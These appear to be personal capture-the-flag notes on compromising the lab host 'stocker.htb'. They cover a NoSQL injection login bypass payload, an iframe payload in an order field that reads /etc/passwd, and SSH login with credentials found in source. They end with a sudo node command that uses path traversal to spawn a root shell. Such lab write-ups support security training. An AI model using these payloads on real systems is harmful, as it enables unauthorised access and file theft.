# Enumeration 

## open ports
80/tcp
22/tcp

stocker.htb
dev.stocker.htb subdomain
bypass login with nosql
changing content to
 application/json
 
`{"username":{"$ne":"xd"},"password":{"$ne":"xd"}}`
1677786997633
found code in page source lead to api
there is api/order that can be used to order
changing method to post
adding order to basket
XSS to LFI
```json
{  
  "basket": [  
    {  
      "_id": "638f116eeb060210cbd83a8d",  
      "title": "<iframe src=file:///etc/passwd height=1000px width=800px></iframe>",  
      "description": "It's a red cup.",  
      "image": "red-cup.jpg",  
      "price": 32,  
      "currentStock": 4,  
      "__v": 0,  
      "amount": 1  
    }  
  ]  
}
```
password inside /var/www/dev/index.js
sshing as angoose

# Privesc 
sudo -l 
![[Pasted image 20230118150732.png]]
escaping path by using ../
created js file to spawn a shell

```
sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/pwn.js
```


# Loot



---
Tags:
Resources: 